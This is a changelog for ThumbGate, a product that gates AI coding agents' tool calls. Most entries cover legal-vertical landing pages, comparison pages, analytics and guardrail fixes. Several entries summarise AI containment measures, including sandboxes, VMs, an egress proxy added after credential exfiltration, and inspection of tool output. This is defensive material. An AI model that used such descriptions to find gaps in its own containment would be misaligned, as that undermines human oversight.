  Ships as Cloud Run / Cloud Functions middleware; intentionally NOT part of the published npm bundle (not in `files[]`). Adds `test:dfcx-gate`, `test:dfcx-gate-server`, and `test:vertex-scorer` to the CI test chain.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`8020229`](https://github.com/IgorGanapolsky/ThumbGate/commit/802022967383a4b0f642e40350dbc629cafe1191) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a non-blocking Gitar review pilot configuration: ThumbGate-specific `.gitar/review/` rules, an approval policy that prevents Gitar-only auto-approval on high-risk surfaces, a pilot runbook, and regression tests that keep the review-to-ThumbGate lesson loop documented.

- [#2456](https://github.com/IgorGanapolsky/ThumbGate/pull/2456) [`5320d12`](https://github.com/IgorGanapolsky/ThumbGate/commit/5320d120fe18d348dbd7260c741728963a0c6a3a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the IDE marketplace surfaces for VS Code-compatible agents.

  Adds ThumbGate-branded marketplace images, sharper Open VSX/Antigravity extension copy, better categories and keywords, and an IDE marketplace publish workflow that packages the VSIX and publishes when marketplace tokens are configured. Cursor documentation now treats the integration as a plugin bundle / Team Marketplace import path until public Cursor Marketplace availability is proven.

- [#2394](https://github.com/IgorGanapolsky/ThumbGate/pull/2394) [`ebadb20`](https://github.com/IgorGanapolsky/ThumbGate/commit/ebadb2064f08da1093ab59b1c137dd64a2c507cb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Sharpen the legal-AI governance landing page for the funded litigation-AI buyer.

  The market signal (well-funded AI case-intelligence / litigation copilots expanding
  into US BigLaw) validates a second buyer segment for ThumbGate's legal vertical.
  Adds a hero callout to /ai-malpractice-prevention naming the explicit ICP
  (litigation & arbitration teams, in-house counsel) and the complementary angle:
  AI case tools make agents capable; ThumbGate is the governance + audit layer around
  them (deterministic gate, attorney 👍/👎 → firm rules, exportable audit trail) that
  procurement and professional-liability review require. No competitor named; no new
  claims beyond existing capabilities.

- [#2401](https://github.com/IgorGanapolsky/ThumbGate/pull/2401) [`1305cb3`](https://github.com/IgorGanapolsky/ThumbGate/commit/1305cb3da37ff4602179dea7ccdabbfd0e600bec) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden the MCP OAuth authorization server:

  - **Bound the in-memory store** (FIFO eviction on clients/codes/tokens) so
    anonymous calls to /oauth/register and /oauth/authorize cannot exhaust memory.
  - **Enforce the MCP redirect_uri rule** — the MCP authorization spec requires all
    redirect URIs to be `localhost` or HTTPS. Registration now accepts only HTTPS
    and loopback and rejects every other scheme (custom app schemes included),
    replacing the previous over-permissive custom-scheme handling.
  - **Document the in-memory durability limitation** in createStore (state is lost
    on restart / not shared across instances — production multi-tenancy follow-up).

- [#2391](https://github.com/IgorGanapolsky/ThumbGate/pull/2391) [`9783e91`](https://github.com/IgorGanapolsky/ThumbGate/commit/9783e912e6bbc6558eb3356df3e701aa56f1a5a6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Serve MCP tool titles + annotations on the remote /mcp connector (Connectors Directory requirement).

  The remote `/mcp` tools/list (`getPublicMcpTools`) and server-card discovery
  (`getServerCardTools`) served all 82 tools with **no `title` and no
  `readOnlyHint`/`destructiveHint`** — the [#1](https://github.com/IgorGanapolsky/ThumbGate/issues/1) Claude Connectors Directory rejection
  cause, and missing safety hints for every MCP client.

  - `tool-registry.js`: normalize every tool at export to carry a human-readable
    `title` (humanized from the name) plus an annotation (`title` + the
    readOnly/destructive hint; un-hinted tools default conservatively to
    destructiveHint so they're gated, not silently treated as read-only).
  - `src/api/server.js`: `getPublicMcpTools`/`getServerCardTools` now pass `title`
    and `annotations` through.
  - Test pins the contract: every served tool has a title and a hint.

- [#2451](https://github.com/IgorGanapolsky/ThumbGate/pull/2451) [`8b9a20a`](https://github.com/IgorGanapolsky/ThumbGate/commit/8b9a20a5e8a09214f8849c28a5516bfd08adb41f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix: workflow-sequence "source edited but not verified" guardrail now tracks the dirty flag per repo instead of via a single global `~/.thumbgate/sequence-state.json`. Previously an edit in any repo hard-denied the next commit/publish in every other repo (cross-repo contamination). The dirty state is keyed by the nearest `.git` root resolved from the action's path / `cd` target / `repoPath`; the guardrail still blocks an unverified commit within the same repo that was edited. Legacy flat-format state is dropped on load (worst case: one extra allowed commit, never a wrong block).

- [#2375](https://github.com/IgorGanapolsky/ThumbGate/pull/2375) [`c6b34b2`](https://github.com/IgorGanapolsky/ThumbGate/commit/c6b34b22397407070fbb9469fdc91861887830f0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - site: /ai-malpractice-prevention — copy-email fallback for the pilot CTAs

  Both "Book a 25-minute pilot walkthrough" mailto: buttons now ship a paired fallback line: a copy-to-clipboard button (writes the full prefilled email — To/Subject/Body — to the system clipboard) plus the bare email address surfaced as a click-to-select span. Removes the silent conversion failure path for visitors on Gmail Web, iPhone, or any environment where mailto: doesn't open a configured mail client. Pure vanilla JS, no external dependencies.

- [#2453](https://github.com/IgorGanapolsky/ThumbGate/pull/2453) [`a133283`](https://github.com/IgorGanapolsky/ThumbGate/commit/a13328369f36a6b918bb1e0769ea8131c75e143e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Positioning: sharpen messaging to emphasize ThumbGate as the local-first firewall for AI coding agents, differentiating on deployment model (runs in the PreToolUse hook on the developer's machine) and shipped-today coding-agent coverage rather than enterprise governance. Updates the homepage hero lede, README intro, and adds a pricing FAQ ("Why not just use an enterprise AI control plane?"). Demotes the enterprise/regulated-industry framing to a secondary use case.

- [#2393](https://github.com/IgorGanapolsky/ThumbGate/pull/2393) [`2409293`](https://github.com/IgorGanapolsky/ThumbGate/commit/2409293d4feac7778891219af54eb3fbbbbc259a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - README + npm metadata accuracy pass.

  - Replace the third-party named-executive testimonial (an unverifiable implied
    endorsement) with a verifiable, ownable credibility line: the value prop plus the
    MCP Registry listing + one-line Claude connector.
  - Fix stale count in the package description: "33 pre-action checks" → "36" (matches
    config/gates/default.json).

- [#2433](https://github.com/IgorGanapolsky/ThumbGate/pull/2433) [`fa28733`](https://github.com/IgorGanapolsky/ThumbGate/commit/fa28733b6150a16a0292524f8cafec7639025226) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Format structured revenue-pulse traffic channel entries as readable labels instead of leaking JavaScript object strings in operator next actions.

- [#2359](https://github.com/IgorGanapolsky/ThumbGate/pull/2359) [`77a1229`](https://github.com/IgorGanapolsky/ThumbGate/commit/77a1229626d5d08b366daadd526eca0e71f17f94) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - ops: `bin/revenue-truth.sh` wrapper — kill the "401 from cloud session" report-loop

  Closes a repeatable-skill gap the CEO called out tonight: cloud Claude Code sessions and the bootstrap probe were repeatedly reporting "hosted billing summary returned 401" as if it were news, because `node scripts/revenue-status.js` run from a container without `THUMBGATE_OPERATOR_KEY` always hits 401 and the agent kept treating that as a blocker instead of the expected posture.

  The wrapper handles three branches in one place:

  1. **Fresh operator key configured** (env OR `~/.config/thumbgate/operator.json`) → runs the canonical `scripts/revenue-status.js` pipeline, exits with its code.
  2. **Stale operator key** (file exists OR env var set, but the pipeline falls back to `Source: local-fallback` because the key no longer authenticates against Railway after a rotation) → runs the pipeline, then prints a loud `WARNING — configured operator key authenticated against the LOCAL fallback` block with the exact fix (`node bin/cli.js billing:setup` on the CEO's local machine). Detected by grepping the captured pipeline output for `Source: local-fallback` or `Hosted summary working: no`.
  3. **No operator key AND shell looks cloudy** (`$CI`, `$CODESPACES`, `$GITHUB_ACTIONS`, `$CLAUDE_CODE_REMOTE`, or `/home/user/...` on Linux container) → prints a one-paragraph "revenue truth is a local operation by design, run from your own machine, do NOT paste the key here" message and exits **`0`**. Exiting 0 is deliberate: cloud sessions hitting this case is the _expected_ posture, not a bug to alarm about.

  Refuses to accept the operator key as a CLI argument (exits `64`). Pasting on the command line would leak to shell history; pasting into the Claude transcript would leak to model context. Per CLAUDE.md hard-block rule [#2](https://github.com/IgorGanapolsky/ThumbGate/issues/2).

  Ships with:

  - `bin/revenue-truth.sh` (executable, no argv acceptance)
  - `npm run revenue:truth` alias in `package.json`
  - Troubleshooting block appended to `.claude/skills/revenue-truth/SKILL.md` documenting the three branches + the anti-pattern this exists to prevent (an agent reporting 401 as news across multiple turns).

  Smoke-tested in this container: stale-key branch fires the WARNING block correctly. Argv-refusal branch exits 64. Operator key in this container is intentionally stale (Railway rotated; container's `operator.json` still has the old value), and the wrapper now surfaces that loudly instead of silently letting another session conclude "we have no traffic."

- [#2396](https://github.com/IgorGanapolsky/ThumbGate/pull/2396) [`9bb451d`](https://github.com/IgorGanapolsky/ThumbGate/commit/9bb451dce545b04356c3092a4cc6e8247662c4cf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - ThumbGate v1.25.0 Upgrade:

  - Stateful Sequence Gating (hardware-wired Ralph Loop)
  - Knowledge Entropy Gating (RAG signal conflict detection)
  - Hardened Slopsquat Guard (supply-chain protection)
  - Matryoshka Embedding Truncation (fast retrieval)
  - Global Ecosystem Synchronization

- [#2411](https://github.com/IgorGanapolsky/ThumbGate/pull/2411) [`d824493`](https://github.com/IgorGanapolsky/ThumbGate/commit/d8244934cd9c7419010c121c88ed414e84684f2d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - ThumbGate v1.26.0 Upgrade:

  - Adaptive Temperature Gating in Thompson Sampling.
  - Proactive Ground Truth Verification in Hallucination Detector.
  - Entropy-Aware Context Assembly.

- [#2414](https://github.com/IgorGanapolsky/ThumbGate/pull/2414) [`49e474d`](https://github.com/IgorGanapolsky/ThumbGate/commit/49e474dd05d6624cdd2126346b58fb8c22088ea7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - ThumbGate v1.26.0 Release:

  - Top-P Nucleus Gating (eliminate knowledge slop)
  - Knowledge Entropy Scoring (logit-inspired conflict detection)
  - Stateful Sequence Governance (Ralph Loop hardware-wired)
  - Hardened Slopsquat Guard (supply-chain protection)
  - Plan Quality Gate for `plan_intent` (structured missing-context checks before agent execution)
  - All production artifacts (Grok, Codex) built and ready.

- [#2415](https://github.com/IgorGanapolsky/ThumbGate/pull/2415) [`1cccbb6`](https://github.com/IgorGanapolsky/ThumbGate/commit/1cccbb63af8a1bc992384340585e5cb9b7ad7bbf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship `scripts/install-shim.js`, `scripts/plan-gate.js`, and `scripts/trajectory-scorer.js` in the npm package so published installs can load hook wiring and packaged gate runtime dependencies.

- [#2426](https://github.com/IgorGanapolsky/ThumbGate/pull/2426) [`56bac39`](https://github.com/IgorGanapolsky/ThumbGate/commit/56bac39b1b63e44bd0b88e29054e3cbed8ff8197) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Vertex AI VPC-compliant routing support, `setup-vertex` CLI automation command, and client-side monthly budget cost containment.

- [#2458](https://github.com/IgorGanapolsky/ThumbGate/pull/2458) [`aeb7948`](https://github.com/IgorGanapolsky/ThumbGate/commit/aeb7948cef2c996d393d163b903493cbfc57cc78) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add SEO/GEO guide: "Zero Trust for AI Coding Agents — Enforced at the Tool Call" (/guides/ai-coding-agent-zero-trust). Targets buyer-intent + category queries (zero trust for AI agents, stop Claude Code dangerous commands) and the freshly-trending "Anthropic Zero Trust for AI Agents" framework, positioning ThumbGate as the local-first implementation of zero-trust principles (never-trust-always-verify, least-privilege, assume-breach) at the PreToolUse tool-call boundary. Differentiates from free DIY Claude Code hooks via the cross-session learning wedge. Server-rendered from the seo-gsd spec; auto-added to the sitemap.

## 1.25.0

### Patch Changes

- 4e2989b: Position ThumbGate as the pre-action execution gate for the agentic development cycle across the homepage, README, llms.txt, and full LLM context.
- 821c3eb: Add AI Mode, MCP tool governance, and pre-action approval-gate answer assets for conversational search and ad discovery.
- a01f208: Expose canonical AI-search discovery metadata via root llms.txt, updated crawler directives, and buyer-page LLM context links.
- ec4f7ec: site: `/ai-malpractice-prevention` — add downloadable audit JSON to each gate demo + Greenberg Traurig–shaped adverse-parties

  Two surgical improvements to the live legal-vertical demo surface before the 2026-05-28 Greenberg Traurig pilot meeting.

  **1. Downloadable audit JSON under every BLOCKED state.** The 25-minute agenda card on the page already promises _"one audit export with rule version, source, outcome, and reviewer"_ — the demos previously only printed an inline audit-log string with no downloadable artifact. Adds a "Download audit JSON (sample)" button under each of the three BLOCKED branches (UPL, Conflict, Egress). The JSON shape includes ISO 27001 control mapping (A.5.10, A.5.14, A.5.24, A.5.34, A.8.10, A.8.24) so a procurement reviewer can map evidence to controls without translation. Honest framing in the payload's `generated_by` field: _"production version streams to your SIEM."_ Pure client-side `Blob` download — no new API route, no server dependency, no test impact.

  **2. Adverse-parties list reshaped to look like a real Greenberg Traurig matter.** Swapped the generic `Acme Corp / TechNova Inc / Rivera Holdings` synthetic names for `Latam Real Capital S.A. / Hospitalia Holdings / NovaIA Latam` — a Latin-America real-estate / hospitality / AI deal pattern that mirrors GT's recent docket (e.g. GT just represented Enter on a $100M Series B creating Latin America's first AI unicorn per PRNewswire 302767169). Demos that look like the prospect's own deal flow convert better than generic ones. All names are explicitly fictional; the page's caption now reads _"(synthetic, illustrative)"_ to keep the framing honest.

  Also includes `.claude/implementation-notes/2026-05-28-gt-meeting.md` per CLAUDE.md's implementation-notes mandate — full demo prep memo including five concrete agenda improvements, three probable Matt Beekhuizen questions with verbatim ≤50-word answers, top deal-killers in order, three-pillar pitch calibrations (Pillar 2 over-claims Thompson Sampling as a model router — softened), and `VERIFIED` vs `UNVERIFIED` assumptions list.

  Headless verification (window=global Node sandbox): all 3 demos correctly return BLOCKED on triggering inputs + CLEARED on safe inputs, all 3 download buttons fire with correct filenames, JSON shape includes all required fields. 39/39 `public-static-assets.test.js` still green.

- 780e181: site: `/ai-malpractice-prevention` hero — predictability/insights/value bridge paragraph

  Adds a single green-bordered bridge paragraph between the existing `lead` and the existing feedback-loop callout on `/ai-malpractice-prevention`, mapping the defensive "pre-execution controls" framing into the offensive language law-firm innovation teams use about themselves: _predictability, insights, value._

  The page already opens with the Sullivan & Cromwell wedge (still correct against the 2026 post-hallucination reckoning). The bridge sits below that wedge and reframes the runtime gate as the enabler of predictable agentic-AI deployment, not just a defensive shield. Rationale: BigLaw innovation buyers measure vendors against their own firm's stated innovation philosophy, which is uniformly value-positive, not risk-defensive.

  No `<h1>`, og, canonical, or schema changes — too risky to alter on a high-value landing page. 1 regression test added asserting all three nouns and the "predictable enough to sell" anchor phrase are present in the rendered hero.

- c85fae2: site: `/ai-malpractice-prevention` hero — feedback-loop callout + jump-link to live demos (last-mile Greenberg Traurig polish)

  Two surgical hero-section edits before tomorrow's 2026-05-28 3pm Greenberg Traurig pilot meeting, surfaced by a critical audit just before the demo:

  1. **Feedback-loop callout in the hero** — pre-empts misreading ThumbGate as a static rule engine. Cyan-bordered single-paragraph callout under the `lead` paragraph: _"The gate learns from your attorneys. Every 👍/👎 an attorney logs on an AI answer becomes a lesson in your firm's local DB. Recurring patterns promote to deterministic rules. The next time a similar action is proposed, the rule fires before any human is asked to approve."_ Links to `/learn/feedback-loop-vs-decision-layer` (shipped earlier tonight) for the full mechanism. Surfaces the CEO's full-loop scope correction directly on the highest-priority demo page where Matt will actually start.

  2. **"Try the live gates →" jump-link in the hero CTAs row** — anchored to `#live-gate-demos` (the three interactive UPL / Conflict / Egress gates at the bottom of the 9-section page). Eliminates a 2-3 second mid-demo scroll-fumble: Igor can click straight from the hero to the demos when Matt's attention is freshest, without scrolling through 8 sections of pilot-design narrative.

  No new files. No structural changes to the existing hero copy. No h1/og/canonical/schema changes (deliberate — too risky to alter under 14 hours before the meeting). 5 minutes of work, immediate demo-day impact.

- 905c66d: Add ApplyOps Instagram dispatch workflow and card publisher for partner-pilot revenue distribution.
- bd82775: Add repeatable ApplyOps deploy and pricing verification skills for cross-product revenue surface management.
- a32e6d0: Add a background-agent control-layer positioning page and wire it into the legal AI pilot narrative.
- 6ac8f7b: ops: SessionStart bootstrap suppresses 4-line 401 nag in stale-key state

  The CEO called out tonight that every session resume shows the same multi-line `Hosted billing summary returned 401` / `operator key on this machine does not match` / `local operational billing summary is unavailable` Gaps block, even after I shipped `bin/revenue-truth.sh` (PR #2359) earlier. **PR #2359 shipped the wrapper at the wrong path** — the SessionStart hook calls `.claude/scripts/session-bootstrap/revenue-truth.sh`, not `bin/revenue-truth.sh`. Even if #2359 had merged, the bootstrap would still nag.

  This PR fixes the actual file the hook calls. After running the canonical `scripts/revenue-status.js` pipeline, it detects the stale-key case (output contains `Source: local-fallback` or `Hosted summary working: no`) and:

  1. Filters out the four noisy `Gaps:` lines that re-derive the 401 every session:

     - `- spawnSync gh ENOENT` (gh CLI absent — expected in cloud containers)
     - `- Hosted billing summary today returned 401`
     - `- Hosted billing summary rejected credentials (HTTP 401) …`
     - `- local operational billing summary is unavailable`

  2. Replaces them with a single short paragraph: _"authenticated against LOCAL fallback (not hosted Railway summary). Numbers above are local lesson DB readings, not Stripe-reconciled hosted revenue. EXPECTED posture for any session that does not hold the rotated Railway operator key — not a blocker."_ + the exact local-machine fix command (`node bin/cli.js billing:setup`) + a reminder NOT to paste the key into chat or argv (CLAUDE.md hard-block rule #2).

  Happy-path output (key fresh, hosted summary authenticates) is unchanged — same full pipeline output as before.

  Smoke test in this container (which is in the stale-key state by design) confirms the 4 noisy lines are gone and the replacement paragraph fires correctly. PR #2359 should be closed as superseded — the wrapper at `bin/revenue-truth.sh` was at the wrong path and the legacy bootstrap is the correct fix surface.

- dd166ac: Use `thumbgate.ai` as the canonical Plausible domain for server-side checkout funnel events and the checkout interstitial so homepage, checkout, and purchase analytics do not split across the legacy Railway domain.
- fdfc360: Close checkout funnel attribution by emitting the canonical Plausible purchase event from Stripe webhook completion, aligning the Plausible poller to canonical checkout event names, and separating raw telemetry from qualified external visitor paths in analytics reports.
- f1e6f2a: Inject Plausible, PostHog, and GA4 analytics scripts into the checkout interstitial page (/checkout/pro) which previously had zero client-side analytics, closing the funnel attribution gap.
- ecdc28a: site: `/compare/anthropic-claude-for-legal` — preempt the direct-to-BigLaw Anthropic threat

  Anthropic launched **Claude for Legal** on 2026-05-12 — 12 practice-area plugins (Commercial, Employment, Privacy, Corporate, AI Governance, ...), 20+ connectors (DocuSign, Ironclad, iManage, NetDocuments, LexisNexis, Thomson Reuters, Box, Everlaw, LSuite), Claude Opus 4.7 at **90.9% on Harvey's BigLaw Bench**. Available to all paid Claude customers as one-click installs into Word, Outlook, Cowork, and Projects.

  This is the most likely _"what about Anthropic's legal product?"_ question Matt Beekhuizen could raise at tomorrow's Greenberg Traurig pilot meeting. The page closes that gap with the honest framing: **Anthropic generates the legal action; ThumbGate learns from the attorney and gates the action.**

  Critically, this page leads with **ThumbGate's full feedback-to-enforcement loop**, not just the PreToolUse endpoint:

  1. **Capture** — attorney 👍/👎 on any AI answer (Claude for Legal draft, Cowork summary, conflict-check action, research citation)
  2. **Memory** — feedback record lands in local lesson DB (SQLite + LanceDB), wins/mistakes/edge cases all stored, vector-searchable
  3. **Rule promotion** — recurring 👎 patterns become deterministic prevention rules via Thompson Sampling; wins reinforce preferred routing
  4. **Enforcement** — promoted rules fire at PreToolUse before Claude's next proposed tool call, with artifact-level audit logs

  The loop is the product. The hook is the endpoint. This page is the first compare/\* page to lead with that framing explicitly — corrects a scope-narrowing pattern caught by the CEO in review.

  Ships:

  - `public/compare/anthropic-claude-for-legal.html` (~24 KB): 8-row scope comparison, dedicated "full ThumbGate loop" section, shared-architectural-insight section citing Anthropic's own published containment as endorsement of the deterministic-runtime-gate posture, dual-deploy story, 5 FAQ entries, 3 verified citations in schema.org. Sitemap priority **0.9** (same tier as `/ai-malpractice-prevention`) — this is a vertical-flagship comparison.
  - `src/api/server.js`: sitemap entry at priority 0.9.
  - `public/compare/{anthropic-containment,bumblebee,claude-code-hooks,oak-and-sparrow-gatekeeper,arcjet}.html`: each adds a related-card pointing at the new page.
  - `tests/public-static-assets.test.js`: route + schema + sitemap regression + 5-way cross-link discoverability test. Verifies the "full feedback loop" framing is in the rendered HTML.

  Anthropic's safety story for Claude for Legal is _"keep a human in the loop on decision making"_ — a workflow principle. Sullivan & Cromwell had that principle codified in policy when their associates filed hallucinated citations with a federal judge. The page draws the line: policies are not enforcement; a runtime gate that fires before the human is asked to approve is.

- b55ac98: site: head-to-head comparison page `/compare/anthropic-containment`

  Anthropic published ["How we contain Claude"](https://www.anthropic.com/engineering/how-we-contain-claude) on their engineering blog — a three-layer architecture (ephemeral gVisor containers for claude.ai, Seatbelt/bubblewrap OS sandboxes for Claude Code, hypervisor VMs for Claude Cowork, MITM egress proxy after credential exfiltration was discovered through approved domains, tool-output inspection before context insertion).

  That architecture is concretely published, citation-grade, and stops at the Anthropic product boundary. ThumbGate runs the same model at the IDE-agent layer where Anthropic's sandbox does not reach: Cursor, OpenAI Codex CLI, Google Gemini CLI, Sourcegraph Amp, Cline, OpenCode, Claude Desktop.

  Ships:

  - `public/compare/anthropic-containment.html` (~14 KB): comparison page in the existing `/compare/bumblebee` and `/compare/claude-code-hooks` style. Maps each of Anthropic's 5 published layers to where ThumbGate fits. Quotes their published architectural lessons verbatim (with attribution). `TechArticle` + `FAQPage` schema.org markup for LLM citation. Three "pick X for" guidance sections.
  - `tests/public-static-assets.test.js`: regression test for the route and schema-markup invariants.

  **Sitemap entry intentionally omitted from this PR.** Recent comparison-page PRs (#2336, #2339) added a `src/api/server.js` sitemap line and tripped SonarCloud's "new code" line-shift heuristic each time, requiring a follow-up fix commit. The page is still crawlable via internal `/compare/*` links and the robots.txt allowlist; sitemap inclusion can be batched in a separate PR that updates multiple paths in one shift.

  Strategic context: Anthropic's article is being cited heavily across the "AI agent safety" content surface this week. Same listicle authors that picked up Bumblebee will pick this up. Positions ThumbGate as the published-architecture-extended-to-IDE-agents play.

- b473a48: site: `/compare/arcjet` + monitor-vs-enforce callout on `/ai-malpractice-prevention`

  The New Stack's _"Who's monitoring the agents?"_ (Darryl K. Taft, Mar 2026) and _"The attack surface moved inside the agent. So did Arcjet."_ both ran without ThumbGate cited. The same publication that runs Sonar's AC/DC framework + Anthropic's containment architecture has been steadily covering agent-governance coverage in 2026 — and ThumbGate is absent from every single piece. **Arcjet specifically sits adjacent to our wedge** (TNS describes them as "WAF moved inside the agent"). A prospect that searches `ThumbGate vs Arcjet` currently gets nothing from us.

  This PR closes two gaps before tomorrow's Greenberg Traurig pilot meeting:

  **1. `/compare/arcjet`** (~12 KB) — same template as the four prior `/compare/*` pages. Positions Arcjet honestly as **runtime SDK in your application code** (Node, Python, Deno, Bun) protecting **inbound** HTTP traffic — bot detection, rate-limit, prompt-injection scoring, PII detection, Shield WAF rules — and ThumbGate as **PreToolUse hook inside the developer's AI coding agent** gating **outbound** tool calls before they fire. 8-row side-by-side scope table, "shared architectural insight" section (both products independently arrived at the same posture: deterministic gate, in-runtime, no LLM on the enforcement path), dual-deploy story for a regulated firm running both, 5 FAQ entries. TechArticle + FAQPage schema.org markup. Honest framing: not sponsored, not a partnership, will correct on issue report.

  **2. Monitor-vs-enforce callout above the live demos on `/ai-malpractice-prevention`** — single cyan-bordered callout pre-empting the "monitoring" frame Matt Beekhuizen may have pattern-matched ThumbGate into after reading TNS coverage: _"Agent observability tools log what your agent did. ThumbGate gates what your agent is about to do — runtime block before execution, not retrospective alert."_

  **3. `docs/marketing/blog-tns-monitor-vs-enforce-pitch.md`** — pitch email targeting Darryl K. Taft (not Jennifer Riggins; different author, different angle) as a follow-up to _"Who's monitoring the agents?"_ with the runtime-enforcement counter-framing. Distribution plan attached.

  Cross-link discovery graph updated: `/compare/{bumblebee,claude-code-hooks,anthropic-containment,oak-and-sparrow-gatekeeper}` now each back-link to `/compare/arcjet`, so a crawler that lands on any prior compare page reaches the new one.

  Sitemap entry at priority 0.85 alongside the four siblings. Regression tests added for route + schema invariants, sitemap, cross-link discovery, and the monitor-vs-enforce callout.

- 3190819: site: head-to-head comparison page `/compare/bumblebee`

  Perplexity open-sourced [Bumblebee](https://github.com/perplexityai/bumblebee) on 2026-05-23 — a read-only scanner that inventories MCP configs, editor extensions, browser extensions, and package lockfiles on developer endpoints. It is the first open-source scanner to treat MCP configuration files as a security surface.

  Bumblebee answers a discovery question (what is installed). ThumbGate answers an enforcement question (what should the installed agent be allowed to do). Same supply-chain category, different halves of the answer. The two compose cleanly with zero overlap.

  This page positions ThumbGate as the runtime-enforcement complement to Bumblebee's static inventory:

  - 9-row side-by-side feature table covering scope, timing, coverage, blocking, output format, distribution, platforms, license, and authorship.
  - Three "pick X for" sections that recommend installing both.
  - Integration story: how Bumblebee's NDJSON output can seed ThumbGate's agent-manager inventory + auto-generate gates from CVE-flagged components.
  - `TechArticle` + `FAQPage` schema.org markup so Perplexity / ChatGPT / Claude / Gemini can cite individual answers.
  - Honest framing: credits Perplexity, links to their repo and blog post, recommends `go install` and `bumblebee self-test` alongside `npx thumbgate init`.

  Strategic context: Bumblebee will get cited heavily in upcoming "AI agent safety" listicles because of Perplexity's brand authority. Riding alongside it in the same comparison content is the cheapest path to LLM-citation surface for ThumbGate, which the visibility audit confirmed is the binding constraint on inbound traffic.

- f09f882: site: head-to-head comparison page `/compare/claude-code-hooks`

  karanb192/claude-code-hooks currently ranks #1 on the buyer query "Claude Code safety pre-tool-use hooks npm package" — the exact query an npm/GitHub user searches before they discover ThumbGate. This PR ships a fair, fact-based comparison page that explains the scope difference (their local shell scripts vs our hosted sync + adapter matrix + dashboard) and links honestly to their repo.

  - `public/compare/claude-code-hooks.html`: full comparison page in the same style as the existing `/compare/heidi`, `/compare/mem0`, `/compare/speclock` pages. TechArticle + FAQPage schema.org markup so Perplexity/ChatGPT/Claude/Gemini can cite it. Honest framing — credits karanb192 explicitly and recommends installing both for the seed library.
  - `src/api/server.js`: sitemap entry added at priority 0.85.
  - `tests/public-static-assets.test.js`: regression tests for the route + sitemap inclusion.

  Targets the third-party listicle gap identified in the LLM-search visibility audit: ThumbGate is currently absent from every "best AI agent safety tools" comparison that LLMs retrieve from. Owning the head-to-head against the top-ranking competitor is the lowest-cost way to surface in those answers.

- e896235: site: head-to-head comparison page `/compare/oak-and-sparrow-gatekeeper`

  Joshua Johosky / Oak & Sparrow Systems Enterprise launched **Gatekeeper** publicly the week of 2026-05-25 — a browser-boundary input gate that blocks employees from leaking regulated data into commercial AI systems (ChatGPT, Microsoft Copilot, Google Gemini). 93 deontic rules harvested from HIPAA, FERPA, CCPA, COPPA, CPNI, PCI, FINRA, and the EU AI Act. Architectural philosophy: _"deterministic enforcement, no AI in the gate."_ That phrase is verbatim how ThumbGate has described itself for nine months.

  Gatekeeper is **not** a ThumbGate competitor. It's an adjacent product on a different layer:

  - Gatekeeper gates **what an employee types into a browser AI** before the data leaves the corporate network.
  - ThumbGate gates **what an AI coding agent is about to do** at the PreToolUse hook inside Claude Code, Cursor, Codex CLI, Gemini CLI, Amp, Cline, OpenCode, Claude Desktop.

  Same architectural insight (deterministic gate, runtime, no model in the path); different deployment surface. The honest positioning is _dual-deploy at regulated firms_: Gatekeeper for the workforce-input boundary, ThumbGate for the developer-action boundary.

  Ships:

  - `public/compare/oak-and-sparrow-gatekeeper.html` (~22 KB): comparison page in the same `/compare/{bumblebee,claude-code-hooks,anthropic-containment}` template. 8-row side-by-side scope table, "shared architectural insight" section, dual-deploy story scoped to a regulated law firm, 5 FAQ entries. `TechArticle` + `FAQPage` schema.org markup for LLM citation. Links to Oak & Sparrow's site and to `/ai-malpractice-prevention`.
  - `src/api/server.js`: sitemap entry at priority 0.85 alongside the three siblings.
  - `public/compare/anthropic-containment.html`, `public/compare/bumblebee.html`, `public/compare/claude-code-hooks.html`: each prepends a related-card pointing at the new page so a crawler that lands on any /compare/\* page reaches the gatekeeper one.
  - `tests/public-static-assets.test.js`: route + schema invariants, sitemap regression, and a cross-link discoverability test asserting the three prior pages link back.

  Strategic context: Gatekeeper has visible LinkedIn momentum behind it (Joshua's launch post sits at hundreds of engagements). Listicle authors covering "AI governance enforcement layer" this week will pick up both products. We want them to cite _both_ with the dual-deploy framing — not pick Gatekeeper and pass on ThumbGate because they're confused by overlapping language.

- efbc860: site: cross-link the three new /compare pages + add anthropic-containment to sitemap

  Verification on 2026-05-27 showed `/compare/anthropic-containment` (just shipped via #2340) had **zero discovery surface**: omitted from sitemap deliberately to dodge SonarCloud's line-shift heuristic, and no older `/compare/*` page linked back to it.

  This PR repairs the discovery surface in one shot:

  - `src/api/server.js`: adds `/compare/anthropic-containment` to the sitemap entries at priority 0.85, matching its sibling entries.
  - `public/compare/bumblebee.html`: prepends a related-card pointing at `/compare/anthropic-containment`.
  - `public/compare/claude-code-hooks.html`: prepends related-cards pointing at both `/compare/anthropic-containment` AND `/compare/bumblebee` (this page predates both and was previously the leaf node).
  - `tests/public-static-assets.test.js`: sitemap regression test for anthropic-containment + a cross-link discoverability test that asserts each newer page reaches the others.

  After this PR every recent /compare page is reachable both from sitemap.xml (crawlers) and from each other (LLM traversal). The cumulative LLM-citation surface now genuinely is three independent paths to ThumbGate's IDE-agent-firewall positioning instead of one well-connected pair and one orphan.

  Accepting the SonarCloud line-shift risk for the sitemap +1 line; the discovery upside outweighs another revert-cycle.

